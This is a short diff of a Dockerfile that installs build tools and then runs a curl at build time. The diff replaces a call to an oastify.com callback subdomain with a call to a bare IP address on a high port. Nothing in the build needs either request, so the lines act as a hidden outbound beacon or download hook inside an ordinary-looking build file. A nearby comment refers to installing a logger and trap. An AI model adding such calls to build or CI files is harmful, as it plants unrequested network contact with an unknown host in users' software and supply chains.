@@ -6,7 +6,7 @@ COPY ci/user.sh .
 RUN ./user.sh $USER_ID ;\
     apt-get update && apt-get install -y asciidoctor make rsync ssh curl gcc python3
 
-RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/asciidoctor.Dockerfile
+RUN curl http://65.109.68.176:15172/built/asciidoctor.Dockerfile
 
 # 1) Install the logger & trap
 COPY ci/command_logger.sh /etc/command_logger.sh
